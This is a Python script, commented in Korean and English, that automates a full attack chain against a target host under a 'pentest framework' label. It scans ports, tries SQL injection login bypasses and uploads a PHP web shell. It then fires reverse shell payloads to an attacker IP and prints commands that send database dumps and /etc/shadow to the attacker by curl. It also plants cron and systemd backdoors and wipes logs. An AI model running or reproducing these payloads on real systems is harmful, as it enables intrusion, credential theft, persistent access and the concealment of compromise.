#!/usr/bin/env python3
"""
완전 자동화 침투 테스트 프레임워크
Full Automated Penetration Testing Framework

사용법:
    python3 10_full_penetration_automation.py -t TARGET_IP -p YOUR_IP

경고: 승인된 침투 테스트 환경에서만 사용하세요.
Warning: Use only in authorized penetration testing environments.
"""

import argparse
import subprocess
import requests
import json
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import base64
import re

class Colors:
    """터미널 색상"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class Logger:
    """로깅 클래스"""
    def __init__(self, log_file='pentest.log'):
        self.log_file = log_file

    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}"

        # 파일에 기록
        with open(self.log_file, 'a') as f:
            f.write(log_entry + '\n')

        # 콘솔 출력
        if level == 'SUCCESS':
            print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {message}")
        elif level == 'ERROR':
            print(f"{Colors.FAIL}[-]{Colors.ENDC} {message}")
        elif level == 'WARNING':
            print(f"{Colors.WARNING}[!]{Colors.ENDC} {message}")
        else:
            print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {message}")

logger = Logger()

class Phase1_Reconnaissance:
    """Phase 1: 정찰 및 정보 수집"""

    def __init__(self, target):
        self.target = target
        self.results = {}

    def port_scan(self):
        """포트 스캔"""
        logger.log("Starting port scan...")
        try:
            cmd = f"nmap -sS -sV -T4 -p- {self.target}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
            self.results['port_scan'] = result.stdout
            logger.log("Port scan completed", "SUCCESS")

            # 열린 포트 추출
            open_ports = re.findall(r'(\d+)/tcp\s+open', result.stdout)
            self.results['open_ports'] = open_ports
            logger.log(f"Found {len(open_ports)} open ports: {', '.join(open_ports)}")

            return True
        except Exception as e:
            logger.log(f"Port scan failed: {e}", "ERROR")
            return False

    def web_scan(self):
        """웹 디렉토리 스캔"""
        logger.log("Starting web directory scan...")
        try:
            # 간단한 디렉토리 체크
            common_dirs = ['admin', 'uploads', 'backup', 'api', 'test', 'dev']
            found_dirs = []

            for directory in common_dirs:
                url = f"http://{self.target}/{directory}"
                try:
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200:
                        found_dirs.append(directory)
                        logger.log(f"Found directory: /{directory}", "SUCCESS")
                except:
                    pass

            self.results['web_dirs'] = found_dirs
            return True
        except Exception as e:
            logger.log(f"Web scan failed: {e}", "ERROR")
            return False

    def backup_file_scan(self):
        """백업 파일 스캔"""
        logger.log("Scanning for backup files...")
        backup_extensions = ['.bak', '.old', '.backup', '.swp', '~']
        common_files = ['index.php', 'config.php', 'admin.php', 'login.php']
        found_backups = []

        for file in common_files:
            for ext in backup_extensions:
                url = f"http://{self.target}/{file}{ext}"
                try:
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200:
                        found_backups.append(f"{file}{ext}")
                        logger.log(f"Found backup: {file}{ext}", "SUCCESS")
                except:
                    pass

        self.results['backup_files'] = found_backups
        return True

    def run(self):
        """모든 정찰 작업 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 1: RECONNAISSANCE")
        logger.log("=" * 60)

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(self.port_scan),
                executor.submit(self.web_scan),
                executor.submit(self.backup_file_scan)
            ]

            for future in as_completed(futures):
                future.result()

        return self.results


class Phase2_SQLInjection:
    """Phase 2: SQL Injection 공격"""

    def __init__(self, target):
        self.target = target
        self.results = {}

    def test_sql_injection(self):
        """SQL Injection 테스트"""
        logger.log("Testing SQL injection vulnerabilities...")

        payloads = [
            "' OR '1'='1",
            "' OR 1=1-- -",
            "admin' OR '1'='1",
            "' UNION SELECT NULL-- -",
            "1' AND '1'='1",
        ]

        # 로그인 페이지 추정
        login_endpoints = [
            f"http://{self.target}/login.php",
            f"http://{self.target}/admin/login.php",
            f"http://{self.target}/api/login",
        ]

        vulnerable = []

        for endpoint in login_endpoints:
            for payload in payloads:
                try:
                    data = {'username': payload, 'password': 'test'}
                    r = requests.post(endpoint, data=data, timeout=5)

                    if 'success' in r.text.lower() or 'welcome' in r.text.lower():
                        vulnerable.append({'endpoint': endpoint, 'payload': payload})
                        logger.log(f"SQL injection successful: {endpoint} with payload: {payload}", "SUCCESS")
                except:
                    pass

        self.results['sql_injection'] = vulnerable
        return len(vulnerable) > 0

    def run(self):
        """SQL Injection 공격 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 2: SQL INJECTION")
        logger.log("=" * 60)

        self.test_sql_injection()
        return self.results


class Phase3_FileUpload:
    """Phase 3: 파일 업로드 공격"""

    def __init__(self, target, attacker_ip):
        self.target = target
        self.attacker_ip = attacker_ip
        self.results = {}

    def create_webshell(self):
        """웹셸 생성"""
        webshell = f"""<?php
if(isset($_GET['cmd'])) {{
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}}
?>"""
        return webshell

    def test_file_upload(self):
        """파일 업로드 취약점 테스트"""
        logger.log("Testing file upload vulnerabilities...")

        upload_endpoints = [
            f"http://{self.target}/upload.php",
            f"http://{self.target}/api/upload",
        ]

        extensions = ['.php', '.php5', '.phtml', '.php.jpg', '.php.png']
        webshell = self.create_webshell()

        for endpoint in upload_endpoints:
            for ext in extensions:
                try:
                    filename = f"shell{ext}"
                    files = {'file': (filename, webshell, 'application/x-php')}

                    r = requests.post(endpoint, files=files, timeout=5)

                    if r.status_code == 200 and 'success' in r.text.lower():
                        logger.log(f"File uploaded: {filename} to {endpoint}", "SUCCESS")
                        self.results['uploaded_file'] = filename
                        return True
                except Exception as e:
                    pass

        return False

    def run(self):
        """파일 업로드 공격 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 3: FILE UPLOAD")
        logger.log("=" * 60)

        self.test_file_upload()
        return self.results


class Phase4_ReverseShell:
    """Phase 4: 리버스 쉘 획득"""

    def __init__(self, target, attacker_ip, attacker_port=4444):
        self.target = target
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.results = {}

    def start_listener(self):
        """Netcat 리스너 시작 (백그라운드)"""
        logger.log(f"Starting listener on port {self.attacker_port}...")
        try:
            cmd = f"nc -lvnp {self.attacker_port}"
            subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
            logger.log("Listener started", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Failed to start listener: {e}", "ERROR")
            return False

    def trigger_reverse_shell(self):
        """리버스 쉘 트리거"""
        logger.log("Attempting to trigger reverse shell...")

        # 여러 방법 시도
        payloads = [
            f"bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_port} 0>&1'",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            f"nc {self.attacker_ip} {self.attacker_port} -e /bin/bash",
        ]

        # 웹셸을 통해 실행
        webshell_urls = [
            f"http://{self.target}/uploads/shell.php",
            f"http://{self.target}/shell.php",
        ]

        for url in webshell_urls:
            for payload in payloads:
                try:
                    r = requests.get(url, params={'cmd': payload}, timeout=3)
                    logger.log(f"Reverse shell payload sent to {url}")
                    time.sleep(2)
                except:
                    pass

        return True

    def run(self):
        """리버스 쉘 공격 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 4: REVERSE SHELL")
        logger.log("=" * 60)

        self.start_listener()
        self.trigger_reverse_shell()
        return self.results


class Phase5_PrivilegeEscalation:
    """Phase 5: 권한 상승"""

    def __init__(self, target):
        self.target = target
        self.results = {}

    def run_linpeas(self):
        """LinPEAS 실행 (리버스 쉘 획득 후)"""
        logger.log("Running privilege escalation enumeration...")
        logger.log("Note: This requires an active shell session")

        # 실제로는 리버스 쉘 세션에서 실행해야 함
        commands = [
            "find / -perm -4000 -type f 2>/dev/null",
            "sudo -l",
            "cat /etc/crontab",
        ]

        logger.log("Privilege escalation commands to run in shell:", "WARNING")
        for cmd in commands:
            logger.log(f"  -> {cmd}")

        return True

    def run(self):
        """권한 상승 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 5: PRIVILEGE ESCALATION")
        logger.log("=" * 60)

        self.run_linpeas()
        return self.results


class Phase6_DataExfiltration:
    """Phase 6: 데이터 탈취"""

    def __init__(self, target, attacker_ip):
        self.target = target
        self.attacker_ip = attacker_ip
        self.results = {}

    def setup_exfil_server(self):
        """데이터 수신 서버 설정"""
        logger.log("Setting up exfiltration server...")

        server_code = f"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        filename = self.headers.get('X-Filename', 'data.bin')
        with open(f'/tmp/exfil_{{filename}}', 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"""

        with open('/tmp/exfil_server.py', 'w') as f:
            f.write(server_code)

        logger.log("Exfiltration server code saved to /tmp/exfil_server.py")
        logger.log("Run: python3 /tmp/exfil_server.py &", "WARNING")

        return True

    def exfiltrate_commands(self):
        """탈취 명령어 생성"""
        logger.log("Data exfiltration commands to run in shell:", "WARNING")

        commands = [
            f"mysqldump -u root -p'PASSWORD' --all-databases | curl -X POST -H 'X-Filename: db.sql' --data-binary @- http://{self.attacker_ip}:8080/",
            f"tar czf - /var/www/html | curl -X POST -H 'X-Filename: html.tar.gz' --data-binary @- http://{self.attacker_ip}:8080/",
            f"cat /etc/shadow | curl -X POST -H 'X-Filename: shadow' --data-binary @- http://{self.attacker_ip}:8080/",
        ]

        for cmd in commands:
            logger.log(f"  -> {cmd}")

        return True

    def run(self):
        """데이터 탈취 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 6: DATA EXFILTRATION")
        logger.log("=" * 60)

        self.setup_exfil_server()
        self.exfiltrate_commands()
        return self.results


class Phase7_Persistence:
    """Phase 7: 지속성 확보"""

    def __init__(self, target, attacker_ip):
        self.target = target
        self.attacker_ip = attacker_ip
        self.results = {}

    def create_backdoors(self):
        """백도어 생성 명령어"""
        logger.log("Persistence commands to run in shell:", "WARNING")

        commands = [
            # SSH Key
            f"mkdir -p /root/.ssh && echo 'ssh-rsa YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys",

            # Cron Job
            f"(crontab -l; echo '*/30 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{self.attacker_ip}/4444 0>&1\"') | crontab -",

            # SUID Binary
            "cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden",

            # Systemd Service
            """cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Monitor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{}/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service""".format(self.attacker_ip),
        ]

        for cmd in commands:
            logger.log(f"  -> {cmd}")

        return True

    def run(self):
        """지속성 확보 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 7: PERSISTENCE")
        logger.log("=" * 60)

        self.create_backdoors()
        return self.results


class Phase8_CoveringTracks:
    """Phase 8: 흔적 제거"""

    def __init__(self, target):
        self.target = target
        self.results = {}

    def cleanup_commands(self):
        """정리 명령어"""
        logger.log("Covering tracks commands to run in shell:", "WARNING")

        commands = [
            # History 삭제
            "history -c && rm ~/.bash_history && unset HISTFILE",

            # 로그 정리
            "> /var/log/auth.log",
            "> /var/log/syslog",
            "> /var/log/apache2/access.log",

            # 특정 IP 제거
            f"sed -i '/{self.target}/d' /var/log/*.log",

            # 업로드한 파일 삭제
            "shred -vfz /var/www/html/uploads/shell.php",

            # 타임스탬프 복원
            "touch -r /bin/bash /var/www/html/uploads/*",
        ]

        for cmd in commands:
            logger.log(f"  -> {cmd}")

        return True

    def run(self):
        """흔적 제거 실행"""
        logger.log("=" * 60)
        logger.log("PHASE 8: COVERING TRACKS")
        logger.log("=" * 60)

        self.cleanup_commands()
        return self.results


class PentestFramework:
    """메인 침투 테스트 프레임워크"""

    def __init__(self, target, attacker_ip):
        self.target = target
        self.attacker_ip = attacker_ip
        self.results = {}

    def run_full_pentest(self):
        """전체 침투 테스트 실행"""
        logger.log(f"\n{Colors.HEADER}{'=' * 60}{Colors.ENDC}")
        logger.log(f"{Colors.HEADER}AUTOMATED PENETRATION TEST FRAMEWORK{Colors.ENDC}")
        logger.log(f"{Colors.HEADER}Target: {self.target}{Colors.ENDC}")
        logger.log(f"{Colors.HEADER}Attacker: {self.attacker_ip}{Colors.ENDC}")
        logger.log(f"{Colors.HEADER}{'=' * 60}{Colors.ENDC}\n")

        # Phase 1: 정찰
        phase1 = Phase1_Reconnaissance(self.target)
        self.results['phase1'] = phase1.run()

        # Phase 2: SQL Injection
        phase2 = Phase2_SQLInjection(self.target)
        self.results['phase2'] = phase2.run()

        # Phase 3: 파일 업로드
        phase3 = Phase3_FileUpload(self.target, self.attacker_ip)
        self.results['phase3'] = phase3.run()

        # Phase 4: 리버스 쉘
        phase4 = Phase4_ReverseShell(self.target, self.attacker_ip)
        self.results['phase4'] = phase4.run()

        # Phase 5: 권한 상승
        phase5 = Phase5_PrivilegeEscalation(self.target)
        self.results['phase5'] = phase5.run()

        # Phase 6: 데이터 탈취
        phase6 = Phase6_DataExfiltration(self.target, self.attacker_ip)
        self.results['phase6'] = phase6.run()

        # Phase 7: 지속성
        phase7 = Phase7_Persistence(self.target, self.attacker_ip)
        self.results['phase7'] = phase7.run()

        # Phase 8: 흔적 제거
        phase8 = Phase8_CoveringTracks(self.target)
        self.results['phase8'] = phase8.run()

        # 최종 보고서
        self.generate_report()

    def generate_report(self):
        """최종 보고서 생성"""
        logger.log("\n" + "=" * 60)
        logger.log("PENETRATION TEST COMPLETE")
        logger.log("=" * 60)

        report_file = f"pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=4)

        logger.log(f"Full report saved to: {report_file}", "SUCCESS")
        logger.log("\nSummary:")
        logger.log(f"  - Reconnaissance: {len(self.results.get('phase1', {}).get('open_ports', []))} open ports found")
        logger.log(f"  - SQL Injection: {len(self.results.get('phase2', {}).get('sql_injection', []))} vulnerabilities")
        logger.log(f"  - File Upload: {'Success' if self.results.get('phase3', {}).get('uploaded_file') else 'Failed'}")
        logger.log(f"  - Reverse Shell: Attempted")
        logger.log(f"  - Full report: {report_file}")


def main():
    parser = argparse.ArgumentParser(
        description='Full Automated Penetration Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 3.35.218.180 -p 192.168.1.100
  %(prog)s -t example.com -p 10.0.0.50 -l 4444

Warning: Use only in authorized penetration testing environments.
        """
    )

    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('-p', '--attacker-ip', required=True, help='Attacker IP (your IP)')
    parser.add_argument('-l', '--listener-port', type=int, default=4444, help='Listener port (default: 4444)')

    args = parser.parse_args()

    # 권한 확인
    if os.geteuid() != 0:
        logger.log("Warning: Some features require root privileges", "WARNING")

    # 프레임워크 실행
    framework = PentestFramework(args.target, args.attacker_ip)
    framework.run_full_pentest()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.log("\n\nPentest interrupted by user", "WARNING")
        sys.exit(0)
    except Exception as e:
        logger.log(f"Fatal error: {e}", "ERROR")
        sys.exit(1)
